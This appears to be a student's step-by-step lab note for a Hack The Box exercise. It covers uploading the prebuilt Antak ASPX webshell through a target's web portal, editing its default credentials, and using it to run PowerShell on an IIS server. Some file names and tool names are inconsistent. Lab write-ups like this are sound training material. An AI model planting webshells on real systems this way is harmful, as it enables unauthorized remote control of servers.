1.add the target to the bottom of the host files(only in htb labs)
	a.sudo bash -c 'echo "10.129.42.197 status.inlanefreight.local" >> /etc/hosts'
2.Grab the prebuilt webshell from laudanum and copy it into my home directory
	a.cp /usr/share/nishang/Antak-WebShell/antak.aspx ./
3.edit the default credentials so that only you can connect
	a.nano shell.aspx
4.Upload via the web portal
	a.http://status.inlanefreight.local/
5.user the web terminal by going to where the iis saves the file
a.http://status.inlanefreight.local/files/antak.aspx
b.SQL query box" = PowerShell command input